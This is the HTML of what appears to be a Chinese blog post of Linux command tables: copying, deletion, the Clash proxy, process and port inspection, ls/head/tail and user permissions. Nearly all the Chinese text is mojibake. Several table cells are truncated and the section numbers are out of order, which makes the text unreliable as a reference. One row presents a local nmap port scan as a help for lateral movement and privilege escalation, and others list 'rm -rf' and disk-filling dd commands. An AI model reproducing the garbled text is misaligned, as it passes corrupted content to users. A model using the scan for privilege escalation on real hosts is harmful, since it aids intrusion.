<td>ä»…å½“æºæ–‡ä»¶æ¯”ç›®æ ‡æ–‡ä»¶æ›´æ–°æ—¶æ‰å¤åˆ¶ï¼ˆå¸¸ç”¨äºå¤‡ä»½ï¼‰</td>
</tr>
<tr>
<td><code>cp -i a b</code></td>
<td>åœ¨è¦†ç›–ç›®æ ‡æ–‡ä»¶å‰æç¤ºç”¨æˆ·ç¡®è®¤</td>
</tr>
<tr>
<td><code>cp -v a b</code></td>
<td>æ˜¾ç¤ºè¯¦ç»†çš„å¤åˆ¶è¿‡ç¨‹ï¼Œåˆ—å‡ºæ­£åœ¨å¤åˆ¶çš„æ–‡ä»¶</td>
</tr>
<tr>
<td><code>cp -a dir1 dir2</code></td>
<td>å¤åˆ¶ç›®å½•åŠå…¶å†…å®¹ï¼Œä¿æŒæ–‡ä»¶çš„åŸå§‹å±æ€§ï¼ˆåŒ…æ‹¬ç¬¦å·é“¾æ¥ï¼‰</td>
</tr>
<tr>
<td><code>cp -l a b</code></td>
<td>åˆ›å»ºç›®æ ‡æ–‡ä»¶çš„ç¡¬é“¾æ¥ï¼Œè€Œéå¤åˆ¶</td>
</tr>
</tbody></table>
<h3 id="3-åˆ é™¤æ–‡ä»¶æ“ä½œ"><a href="#3-åˆ é™¤æ–‡ä»¶æ“ä½œ" class="headerlink" title="3.åˆ é™¤æ–‡ä»¶æ“ä½œ"></a>3.åˆ é™¤æ–‡ä»¶æ“ä½œ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">| å‘½ä»¤          | ä½œç”¨                   |</span><br><span class="line">| ------------- | ---------------------- |</span><br><span class="line">| `rm file`     | åˆ é™¤å•ä¸ªæ–‡ä»¶           |</span><br><span class="line">| `rm -f file`  | å¼ºåˆ¶åˆ é™¤ï¼Œä¸æç¤º       |</span><br><span class="line">| `rm -r dir`   | åˆ é™¤ç›®å½•ï¼ˆé€’å½’ï¼‰       |</span><br><span class="line">| `rm -rf dir`  | å¼ºåˆ¶åˆ é™¤æ•´ä¸ªç›®å½•       |</span><br><span class="line">| `unlink file` | åˆ é™¤å•æ–‡ä»¶çš„è½»é‡å‘½ä»¤   |</span><br><span class="line">| `find + rm`   | åˆ é™¤åŒ¹é…è§„åˆ™çš„æ‰¹é‡æ–‡ä»¶ |</span><br><span class="line"></span><br><span class="line">### 4.ä½¿ç”¨ä»£ç†</span><br><span class="line"></span><br><span class="line">``` php </span><br><span class="line">./clash -f ./config.yaml                           --ç›´æ¥è¿è¡Œ</span><br><span class="line">nohup ./clash -f ./config.yaml &gt; clash.log 2&gt;&amp;1 &amp;       --ä»¥åå°çš„æ–¹å¼è¿è¡Œ</span><br></pre></td></tr></table></figure>

<h4 id="æµ‹è¯•æ˜¯å¦æˆåŠŸ"><a href="#æµ‹è¯•æ˜¯å¦æˆåŠŸ" class="headerlink" title="æµ‹è¯•æ˜¯å¦æˆåŠŸ"></a>æµ‹è¯•æ˜¯å¦æˆåŠŸ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æµ‹è¯• HTTP ä»£ç†ç«¯å£ï¼š</span><br><span class="line">            curl -x http:<span class="comment">//127.0.0.1:7890 https://ipinfo.io</span></span><br><span class="line">æµ‹è¯• SOCKS5 ç«¯å£ï¼š</span><br><span class="line">               curl --socks5 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7891</span> https:<span class="comment">//ipinfo.io</span></span><br><span class="line">proxychains curl https:<span class="comment">//ipinfo.io</span></span><br></pre></td></tr></table></figure>

<h3 id="5-xargsä¼ é€’è¾“å‡º"><a href="#5-xargsä¼ é€’è¾“å‡º" class="headerlink" title="5.xargsä¼ é€’è¾“å‡º:"></a>5.xargsä¼ é€’è¾“å‡º:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®ƒè¯»å–æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰çš„ä¸€è¡Œä¸€è¡Œå†…å®¹ï¼Œç„¶åæŠŠå®ƒâ€œæ‹¼æ¥â€åˆ°åé¢çš„å‘½ä»¤åé¢ã€‚</span><br><span class="line">xargs cat =cat æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 ...</span><br></pre></td></tr></table></figure>

<h3 id="6-catå‡½æ•°ç±»ä¼¼çš„-â€”linxuå‡½æ•°"><a href="#6-catå‡½æ•°ç±»ä¼¼çš„-â€”linxuå‡½æ•°" class="headerlink" title="6.catå‡½æ•°ç±»ä¼¼çš„ â€”linxuå‡½æ•°"></a>6.catå‡½æ•°ç±»ä¼¼çš„ â€”linxuå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹ </span><br><span class="line">file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</span><br><span class="line">paste: æ¯ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ–‡ä»¶å¯¹åº”è¡Œç”¨TABæ‹¼æ¥èµ·æ¥ã€‚</span><br><span class="line">rev: æ¯ä¸€è¡Œçš„å­—ç¬¦é¡ºåºè¢«é¢ å€’è¾“å‡ºäº†ã€‚</span><br><span class="line">strings:  -- ä¼šä»äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å¯æ‰§è¡Œæ–‡ä»¶ã€.so æ–‡ä»¶ã€å›¾ç‰‡ç­‰ï¼‰ä¸­æ‰¾å‡º å¯æ‰“å°å­—ç¬¦åºåˆ—ï¼ˆå¯è¯»æ–‡æœ¬ï¼‰ã€‚</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<h3 id="7-åˆ›å»ºä¸€ä¸ªæ–‡ä»¶"><a href="#7-åˆ›å»ºä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="7.åˆ›å»ºä¸€ä¸ªæ–‡ä»¶:"></a>7.åˆ›å»ºä¸€ä¸ªæ–‡ä»¶:</h3><table>
<thead>
<tr>
<th>å‘½ä»¤ç¤ºä¾‹</th>
<th>ä½œç”¨</th>
<th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody><tr>
<td><code>touch file.txt</code></td>
<td>åˆ›å»ºç©ºæ–‡ä»¶</td>
<td>æ–‡ä»¶å·²å­˜åœ¨æ—¶æ›´æ–°æ—¶é—´æˆ³</td>
</tr>
<tr>
<td><code>echo &quot;hello&quot; &gt; file.txt</code></td>
<td>åˆ›å»ºå¹¶å†™å…¥å†…å®¹</td>
<td>ä¼šè¦†ç›–å·²æœ‰æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td><code>cat &gt; file.txt</code> ï¼ˆè¾“å…¥å†…å®¹åæŒ‰ <code>Ctrl+D</code>ï¼‰</td>
<td>æ‰‹åŠ¨è¾“å…¥å†…å®¹åˆ›å»ºæ–‡ä»¶</td>
<td>é€‚åˆä¸€æ¬¡æ€§å†™å¤šè¡Œ</td>
</tr>
<tr>
<td><code>printf &quot;flag&#123;123&#125;\n&quot; &gt; flag.txt</code></td>
<td>åˆ›å»ºå¹¶å†™å…¥æ ¼å¼åŒ–å†…å®¹</td>
<td>å¯ç”¨äºç”Ÿæˆ CTF flag ç­‰ç»“æ„åŒ–å†…å®¹</td>
</tr>
<tr>
<td><code>&gt; empty.txt</code></td>
<td>åˆ›å»ºç©ºæ–‡ä»¶</td>
<td>æ–‡ä»¶å·²å­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹</td>
</tr>
<tr>
<td><code>dd if=/dev/zero of=bigfile.bin bs=1M count=10</code></td>
<td>åˆ›å»ºæŒ‡å®šå¤§å°æ–‡ä»¶</td>
<td>å¸¸ç”¨äºæµ‹è¯•ã€ç£ç›˜å¡«å……</td>
</tr>
<tr>
<td><code>vi file.php</code> <code>nano file.txt</code></td>
<td>æ‰“å¼€ç¼–è¾‘å™¨åˆ›å»º</td>
<td>å†™å®Œä¿å­˜å³å¯ç”Ÿæˆæ–‡ä»¶</td>
</tr>
</tbody></table>
<h3 id="8-æŸ¥çœ‹è¿›ç¨‹"><a href="#8-æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="8.æŸ¥çœ‹è¿›ç¨‹;"></a>8.æŸ¥çœ‹è¿›ç¨‹;</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>ps aux</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹</td>
<td>&#96;ps aux</td>
</tr>
<tr>
<td><code>top</code> &#x2F; <code>htop</code></td>
<td>å®æ—¶æ˜¾ç¤ºè¿›ç¨‹åŠ¨æ€ä¿¡æ¯</td>
<td><code>top</code>ï¼ˆ<code>htop</code>æ›´ç¾è§‚ï¼‰</td>
</tr>
<tr>
<td><code>pidof &lt;name&gt;</code></td>
<td>æŸ¥æ‰¾æŸä¸ªç¨‹åºçš„ PID</td>
<td><code>pidof clash</code></td>
</tr>
<tr>
<td><code>pgrep &lt;pattern&gt;</code></td>
<td>è¿›ç¨‹ååŒ¹é…å¹¶è¿”å› PID</td>
<td><code>pgrep -fl clash</code></td>
</tr>
<tr>
<td><code>lsof -p &lt;pid&gt;</code></td>
<td>æŸ¥çœ‹æŸè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</td>
<td><code>lsof -p 1234</code></td>
</tr>
<tr>
<td><code>netstat -tunlp</code></td>
<td>æŸ¥çœ‹è¿›ç¨‹ç›‘å¬ç«¯å£</td>
<td>&#96;netstat -tunlp</td>
</tr>
<tr>
<td><code>ss -tulnp</code></td>
<td>æ›´å¿«çš„ <code>netstat</code> æ›¿ä»£</td>
<td>&#96;ss -tulnp</td>
</tr>
<tr>
<td><code>strace -p &lt;pid&gt;</code></td>
<td>è·Ÿè¸ªæŸè¿›ç¨‹ç³»ç»Ÿè°ƒç”¨</td>
<td><code>strace -p 1234</code></td>
</tr>
</tbody></table>
<h3 id="9-æŸ¥çœ‹ç«¯å£"><a href="#9-æŸ¥çœ‹ç«¯å£" class="headerlink" title="9.æŸ¥çœ‹ç«¯å£:"></a>9.æŸ¥çœ‹ç«¯å£:</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>netstat -tunlp</code></td>
<td>æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£ + å¯¹åº”è¿›ç¨‹</td>
<td>&#96;netstat -tunlp</td>
</tr>
<tr>
<td><code>ss -tulnp</code></td>
<td>æ›´å¿«çš„ <code>netstat</code> æ›¿ä»£</td>
<td>&#96;ss -tulnp</td>
</tr>
<tr>
<td><code>lsof -i:&lt;ç«¯å£&gt;</code></td>
<td>æŸ¥çœ‹ç«¯å£å¯¹åº”çš„è¿›ç¨‹</td>
<td><code>lsof -i:7890</code></td>
</tr>
<tr>
<td><code>fuser &lt;ç«¯å£&gt;/tcp</code></td>
<td>å¿«é€ŸæŸ¥çœ‹å“ªä¸ªPIDå ç”¨äº†ç«¯å£</td>
<td><code>fuser 8080/tcp</code></td>
</tr>
<tr>
<td><code>cat /proc/net/tcp</code></td>
<td>ç›´æ¥è¯»å–ç³»ç»Ÿ TCP è¡¨</td>
<td>å¯å†™è„šæœ¬æŸ¥æ‰€æœ‰ç«¯å£çŠ¶æ€</td>
</tr>
<tr>
<td><code>nmap 127.0.0.1 -p-</code></td>
<td>æ‰«ææœ¬åœ°å¼€æ”¾ç«¯å£</td>
<td>æœ¬åœ°æ¨ªå‘æ‰«æã€ææƒè¾…åŠ©</td>
</tr>
</tbody></table>
<h4 id="1-å‚æ•°ç›¸å…³"><a href="#1-å‚æ•°ç›¸å…³" class="headerlink" title="1.å‚æ•°ç›¸å…³:"></a>1.å‚æ•°ç›¸å…³:</h4><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-t</code></td>
<td>TCP</td>
<td>ä»…æ˜¾ç¤º TCP è¿æ¥</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>UDP</td>
<td>ä»…æ˜¾ç¤º UDP è¿æ¥</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>Listen</td>
<td>ä»…æ˜¾ç¤ºç›‘å¬çŠ¶æ€ï¼ˆå¦‚æœåŠ¡å™¨åœ¨ç­‰å¾…è¿æ¥ï¼‰</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>Numeric</td>
<td>ä¸è§£æåŸŸå&#x2F;æœåŠ¡åï¼Œæ˜¾ç¤ºåŸå§‹IPå’Œç«¯å£å·ï¼ˆåŠ é€Ÿã€ç»•è¿‡DNSï¼‰</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>Process</td>
<td>æ˜¾ç¤ºå“ªä¸ªè¿›ç¨‹ï¼ˆPID&#x2F;ç¨‹åºåï¼‰å ç”¨æ­¤è¿æ¥ï¼Œéœ€è¦ <code>root</code> æƒé™</td>
</tr>
</tbody></table>
<h3 id="10-æŠŠå¸®åŠ©ä¿¡æ¯è®¾ç½®ä¸ºä¸­æ–‡"><a href="#10-æŠŠå¸®åŠ©ä¿¡æ¯è®¾ç½®ä¸ºä¸­æ–‡" class="headerlink" title="10.æŠŠå¸®åŠ©ä¿¡æ¯è®¾ç½®ä¸ºä¸­æ–‡:"></a>10.æŠŠå¸®åŠ©ä¿¡æ¯è®¾ç½®ä¸ºä¸­æ–‡:</h3><h4 id="1-ä¸‹è½½æ±‰åŒ–åŒ…"><a href="#1-ä¸‹è½½æ±‰åŒ–åŒ…" class="headerlink" title="1.ä¸‹è½½æ±‰åŒ–åŒ…;"></a>1.ä¸‹è½½æ±‰åŒ–åŒ…;</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install language-pack-zh-hans</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå¯ä»¥è¿™æ ·è®¿é—®ä¸­æ–‡:    LANG&#x3D;zh_CN.UTF-8 netstat â€“help</p>
<h4 id="2-å°†LANG-zh-CN-UTF-8è®¾ç½®åˆ«å"><a href="#2-å°†LANG-zh-CN-UTF-8è®¾ç½®åˆ«å" class="headerlink" title="2.å°†LANG&#x3D;zh_CN.UTF-8è®¾ç½®åˆ«å;"></a>2.å°†LANG&#x3D;zh_CN.UTF-8è®¾ç½®åˆ«å;</h4><h5 id="1-ä¸´æ—¶è®¾ç½®åˆ«å"><a href="#1-ä¸´æ—¶è®¾ç½®åˆ«å" class="headerlink" title="1.ä¸´æ—¶è®¾ç½®åˆ«å;"></a>1.ä¸´æ—¶è®¾ç½®åˆ«å;</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸´æ—¶ç”Ÿæ•ˆï¼ˆå½“å‰ç»ˆç«¯æœ‰æ•ˆï¼‰</span><br><span class="line">          alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="2-æ°¸ä¹…ç”Ÿæ•ˆï¼ˆè‡ªåŠ¨åŠ è½½ï¼‰"><a href="#2-æ°¸ä¹…ç”Ÿæ•ˆï¼ˆè‡ªåŠ¨åŠ è½½ï¼‰" class="headerlink" title="2.æ°¸ä¹…ç”Ÿæ•ˆï¼ˆè‡ªåŠ¨åŠ è½½ï¼‰"></a>2.æ°¸ä¹…ç”Ÿæ•ˆï¼ˆè‡ªåŠ¨åŠ è½½ï¼‰</h5><p>ç¼–è¾‘ä½ çš„ shell é…ç½®æ–‡ä»¶ï¼š</p>
<ul>
<li>å¦‚æœä½ ç”¨çš„æ˜¯ bashï¼š</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ ç”¨çš„æ˜¯ zshï¼š</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ è¿™ä¸€è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜åè®©å®ƒç«‹å³ç”Ÿæ•ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">source ~/.bashrc   # æˆ– ~/.zshrc</span><br></pre></td></tr></table></figure>

<h3 id="11-lså‘½ä»¤"><a href="#11-lså‘½ä»¤" class="headerlink" title="11.lså‘½ä»¤"></a>11.lså‘½ä»¤</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-l</code></td>
<td>ä»¥é•¿æ ¼å¼åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼ˆæƒé™ã€ç”¨æˆ·ã€å¤§å°ã€ä¿®æ”¹æ—¶é—´ç­‰ï¼‰</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥ <code>.</code> å¼€å¤´çš„éšè—æ–‡ä»¶</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>ä¸ <code>-l</code> é…åˆä½¿ç”¨ï¼Œæ˜¾ç¤ºäººç±»å¯è¯»çš„æ–‡ä»¶å¤§å°ï¼ˆå¦‚ 1Kï¼Œ234Mï¼‰</td>
</tr>
<tr>
<td><code>-S</code></td>
<td>æŒ‰æ–‡ä»¶å¤§å°æ’åºï¼Œé»˜è®¤æ˜¯ä»å¤§åˆ°å°</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>åå‘æ’åºï¼ˆä¸ <code>-t</code>ã€<code>-S</code> ç­‰é…åˆä½¿ç”¨æ—¶æ•ˆæœæ˜æ˜¾ï¼‰</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>æŒ‰æ—¶é—´æ’åºï¼Œæœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶æ’åœ¨å‰é¢</td>
</tr>
<tr>
<td><code>-R</code></td>
<td>é€’å½’åˆ—å‡ºå­ç›®å½•å†…å®¹</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>å¦‚æœåé¢è·Ÿçš„æ˜¯ç›®å½•ï¼Œåªæ˜¾ç¤ºç›®å½•æœ¬èº«è€Œä¸æ˜¯å…¶å†…å®¹</td>
</tr>
<tr>
<td><code>-F</code></td>
<td>åœ¨æ–‡ä»¶ååé™„ä¸Šç¬¦å·ï¼ˆå¦‚ <code>/</code> è¡¨ç¤ºç›®å½•ï¼Œ<code>*</code> è¡¨ç¤ºå¯æ‰§è¡Œï¼‰</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>æ˜¾ç¤ºæ–‡ä»¶çš„ inode ç¼–å·</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>ç±»ä¼¼ <code>-l</code>ï¼Œä½†æ˜¾ç¤º UID å’Œ GID è€Œéç”¨æˆ·åå’Œç»„å</td>
</tr>
<tr>
<td><code>--color=auto</code></td>
<td>ç»™æ–‡ä»¶åä¸Šè‰²ï¼ˆç›®å½•è“è‰²ã€å¯æ‰§è¡Œç»¿è‰²ç­‰ï¼‰ï¼Œé€šå¸¸é»˜è®¤å¯ç”¨</td>
</tr>
<tr>
<td><code>--time=ctime</code></td>
<td>ä½¿ç”¨å˜æ›´æ—¶é—´ï¼ˆctimeï¼‰æ’åºï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ä¿®æ”¹æ—¶é—´ï¼ˆmtimeï¼‰</td>
</tr>
<tr>
<td><code>-1</code></td>
<td>æ¯ä¸ªæ–‡ä»¶å•ç‹¬ä¸€è¡Œæ˜¾ç¤ºï¼ˆé»˜è®¤å¤šä¸ªåˆ—æ˜¾ç¤ºæ—¶ä½¿ç”¨ï¼‰</td>
</tr>
</tbody></table>
<h4 id="lså¸¸ç”¨ç»„åˆ"><a href="#lså¸¸ç”¨ç»„åˆ" class="headerlink" title="lså¸¸ç”¨ç»„åˆ"></a>lså¸¸ç”¨ç»„åˆ</h4><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ç”¨æ³•è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>ls -alh</code></td>
<td>åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ + è¯¦ç»†ä¿¡æ¯ + å¯è¯»å¤§å°</td>
</tr>
<tr>
<td><code>ls -lhS</code></td>
<td>æŒ‰å¤§å°æ’åºæ˜¾ç¤ºæ–‡ä»¶</td>
</tr>
<tr>
<td><code>ls -lt</code></td>
<td>æŒ‰ä¿®æ”¹æ—¶é—´æ’åº</td>
</tr>
<tr>
<td><code>ls -ltr</code></td>
<td>æŒ‰æ—¶é—´å‡åºæ’åˆ—ï¼ˆæ—§æ–‡ä»¶åœ¨å‰ï¼‰</td>
</tr>
<tr>
<td><code>ls -R</code></td>
<td>æŸ¥çœ‹å½“å‰ç›®å½•åŠæ‰€æœ‰å­ç›®å½•å†…å®¹</td>
</tr>
</tbody></table>
<h3 id="12-headå‘½ä»¤"><a href="#12-headå‘½ä»¤" class="headerlink" title="12.headå‘½ä»¤:"></a>12.headå‘½ä»¤:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨äºæŸ¥çœ‹æ–‡ä»¶æˆ–è¾“å‡ºçš„å‰å‡ è¡Œã€‚</span><br><span class="line">head [é€‰é¡¹] [æ–‡ä»¶å]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-n N</code></td>
<td>æ˜¾ç¤ºå‰ N è¡Œï¼ˆé»˜è®¤æ˜¯ 10 è¡Œï¼‰</td>
<td><code>head -n 5 file.txt</code></td>
</tr>
<tr>
<td><code>-c N</code></td>
<td>æ˜¾ç¤ºå‰ N ä¸ªå­—èŠ‚</td>
<td><code>head -c 20 file.txt</code></td>
</tr>
</tbody></table>
<h4 id="14-tail-å‘½ä»¤"><a href="#14-tail-å‘½ä»¤" class="headerlink" title="14.tail å‘½ä»¤:"></a>14.tail å‘½ä»¤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨äºæŸ¥çœ‹æ–‡ä»¶æˆ–è¾“å‡ºçš„æœ€åå‡ è¡Œã€‚</span><br><span class="line">tail [é€‰é¡¹] [æ–‡ä»¶å]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-n N</code></td>
<td>æ˜¾ç¤ºæœ€å N è¡Œï¼ˆé»˜è®¤ 10 è¡Œï¼‰</td>
<td><code>tail -n 5 error.log</code></td>
</tr>
<tr>
<td><code>-c N</code></td>
<td>æ˜¾ç¤ºæœ€å N ä¸ªå­—èŠ‚</td>
<td><code>tail -c 100 file.txt</code></td>
</tr>
<tr>
<td><code>-f</code></td>
<td>å®æ—¶è¾“å‡ºè¿½åŠ çš„å†…å®¹ï¼ˆæ—¥å¿—ç›‘æ§ï¼‰</td>
<td><code>tail -f /var/log/syslog</code></td>
</tr>
<tr>
<td><code>+N</code></td>
<td>ä»ç¬¬ N è¡Œå¼€å§‹æ˜¾ç¤ºï¼ˆå¸¸ç”¨äºæ­é… <code>tail -n +2</code>ï¼‰</td>
<td><code>tail -n +2 file.txt</code></td>
</tr>
</tbody></table>
<h2 id="13-åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶è®¾ç½®å¯†ç ä¸æƒé™"><a href="#13-åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶è®¾ç½®å¯†ç ä¸æƒé™" class="headerlink" title="13.åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶è®¾ç½®å¯†ç ä¸æƒé™"></a>13.åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶è®¾ç½®å¯†ç ä¸æƒé™</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ–°ç”¨æˆ·</span><br><span class="line">        sudo adduser ç”¨æˆ·å</span><br><span class="line">è®¾ç½®ç”¨æˆ·å¯†ç ï¼ˆå¦‚æœæ²¡è®¾ç½®æˆåŠŸæˆ–è¦ä¿®æ”¹ï¼‰</span><br><span class="line">         sudo passwd ç”¨æˆ·å</span><br><span class="line">èµ‹äºˆæƒé™ï¼ˆåŠ å…¥ç‰¹å®šç»„ï¼‰       </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æƒé™ç±»å‹</th>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æ›´æ”¹æ‰€æœ‰è€…</td>
<td><code>chown ç”¨æˆ·å æ–‡ä»¶/ç›®å½•</code></td>
<td>æ”¹ä¸ºè¯¥ç”¨æˆ·æ‹¥æœ‰æ–‡ä»¶</td>
</tr>
<tr>
<td>æ›´æ”¹æƒé™</td>
<td><code>chmod</code> å‘½ä»¤</td>
<td><code>rwx</code> æƒé™è®¾ç½®ï¼ˆè¯»&#x2F;å†™&#x2F;æ‰§è¡Œï¼‰</td>
</tr>
<tr>
<td>åŠ å…¥ç»„</td>
<td><code>usermod -aG ç»„å ç”¨æˆ·</code></td>
<td>åŠ ç”¨æˆ·åˆ°æŒ‡å®šç”¨æˆ·ç»„</td>
</tr>
<tr>
<td>è®¾ç½® ACL</td>
<td><code>setfacl -m</code></td>
<td>ç²¾ç»†è®¾ç½®ç”¨æˆ·&#x2F;ç»„çš„è®¿é—®æƒé™</td>
</tr>
</tbody></table>
<h3 id="æŸ¥çœ‹ç”¨æˆ·æƒé™"><a href="#æŸ¥çœ‹ç”¨æˆ·æƒé™" class="headerlink" title="æŸ¥çœ‹ç”¨æˆ·æƒé™;"></a>æŸ¥çœ‹ç”¨æˆ·æƒé™;</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ç”¨é€”</th>
<th>ç¤ºä¾‹</th>
<th>è¾“å‡ºè§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td><code>whoami</code></td>
<td>æŸ¥çœ‹å½“å‰ç”¨æˆ·å</td>
<td><code>whoami</code></td>
<td>å¦‚ï¼š<code>alice</code></td>
</tr>
<tr>
<td><code>id</code></td>
<td>æŸ¥çœ‹ UIDã€GIDã€æ‰€å±ç»„</td>
<td><code>id</code></td>
<td><code>uid=1001(alice) gid=1001(alice) groups=1001(alice),100(users)</code></td>
</tr>
<tr>
<td><code>groups</code></td>
<td>æ˜¾ç¤ºæ‰€å±çš„æ‰€æœ‰ç»„</td>
<td><code>groups</code></td>
<td>å¦‚ï¼š<code>alice users</code></td>
</tr>
<tr>
<td><code>echo $PATH</code></td>
<td>æŸ¥çœ‹å‘½ä»¤æœç´¢è·¯å¾„</td>
<td><code>echo $PATH</code></td>
<td>å¯æ‰§è¡Œå‘½ä»¤æ‰€åœ¨ç›®å½•</td>
</tr>
<tr>
<td><code>ls -l /è·¯å¾„/æ–‡ä»¶</code></td>
<td>æŸ¥çœ‹æ–‡ä»¶æƒé™</td>
<td><code>ls -l /etc/passwd</code></td>
<td><code>-rw-r--r--</code> è¡¨ç¤ºæ‰€æœ‰äººå¯è¯»</td>
</tr>
<tr>
<td><code>namei -l /è·¯å¾„/æ–‡ä»¶</code></td>
<td>é€çº§æŸ¥çœ‹è·¯å¾„æƒé™</td>
<td><code>namei -l /etc/passwd</code></td>
<td>æ£€æŸ¥æŸçº§ç›®å½•æƒé™æ˜¯å¦é˜»æ–­</td>
</tr>
<tr>
<td><code>getfacl /è·¯å¾„/æ–‡ä»¶</code></td>
<td>æŸ¥çœ‹æ–‡ä»¶çš„ ACL æƒé™ï¼ˆå¦‚æœå¯ç”¨ï¼‰</td>
<td><code>getfacl myfile</code></td>
<td>æ˜¾ç¤ºå…·ä½“ç”¨æˆ·çš„é™„åŠ æƒé™</td>
</tr>
<tr>
<td><code>test -x å‘½ä»¤è·¯å¾„</code></td>
